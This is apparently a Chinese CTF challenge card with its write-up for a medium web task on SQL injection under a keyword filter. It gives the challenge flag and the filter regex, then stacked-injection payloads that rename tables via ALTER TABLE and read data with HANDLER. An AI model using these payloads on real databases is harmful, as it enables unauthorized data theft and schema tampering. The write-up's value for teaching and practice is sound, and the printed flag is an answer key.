* 题目名称： saveSaofe1a_partB

* 题目类型： WEB

* 题目难度： 中等

* 出题人： Chimedal

* 考点：有过滤sql注入

* 描述：知道了小美的hobby后，你准备了一份大礼，可是Saofe1a竟然不知道小美在什么大学，这时你也只好重新在系统里面找找有没有遗漏的线索。可是，上一次的攻击似乎被网站管理员发现了，这个系统得到了史诗级的加强。黑客的战斗没有硝烟，这一次，阁下又该如何应对？

* flag： XSCTF{Saofe1a_wAnt_a_9ir1fri3nd}

* Writeup：
```
/select|update|delete|drop|insert|where|\./i
set&prepare&execute都没了
```
## 判断闭合方式：
小知识：注释可以#或者--
1. 输入1，可行，再输入`1'`报错
2. 说明了两点：本题的闭合方式确实是`'`闭合，同时我们确定在本题我们是有可能是能使用报错注入的。
3. 判断是否有关键字过滤：先直接输入： **select** 查看回显，
4. select一被禁用，联合查询，报错注入，布尔,时间盲注就都不可以使用了。我们只剩下了 **堆叠注入**。
5. ```1';show databases#```
6. ```1';show tables;#```查看数据表
7. 奇奇怪怪的表`2333`包有问题的，看结构
   * 方法：```1';desc `2333`;#```
   * 注意，如果tableName是纯数字，需要用反引号包裹

## 方法一:
可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是和上题一样的class1表的数据，查看class1表结构第一个字段名为id我们把class1表随便改成class，然后把2333表改成class1，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：```1'; alter table class1 rename to class;alter table `2333` rename to class1;#```,然后输入```1' or 1 = 1 #```成功获取到flag。

## 方法二:
此题还可以通过handle直接出答案：```1';HANDLER `2333` OPEN;HANDLER `2333` READ FIRST;HANDLER `2333` CLOSE;```
